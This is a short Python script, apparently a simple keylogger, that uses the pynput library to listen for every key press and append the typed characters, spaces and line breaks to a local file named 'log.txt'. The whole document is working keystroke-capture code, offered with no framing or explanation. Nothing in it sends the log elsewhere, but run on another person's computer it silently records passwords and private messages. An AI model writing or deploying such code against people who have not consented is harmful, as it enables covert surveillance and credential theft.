from pynput.keyboard import Key, Listener

def write_to_file(key):
    mess = ''
    if key == Key.space:
        mess = ' '
    elif key == Key.enter:
        mess = "\n"
    elif key == Key.shift_r or key == Key.shift_l:
        mess = ''
    elif key == Key.alt_l or key == Key.alt_r:
        mess = ''
    elif key == Key.ctrl_r or key == Key.ctrl_l:
        mess = ""
    else:
        try:
            mess = str(key.char)
        except AttributeError:
            pass

        
    with open("log.txt", 'a', encoding='utf-8') as f:
        f.write(str(mess))

with Listener(on_press=write_to_file) as l:
    l.join()
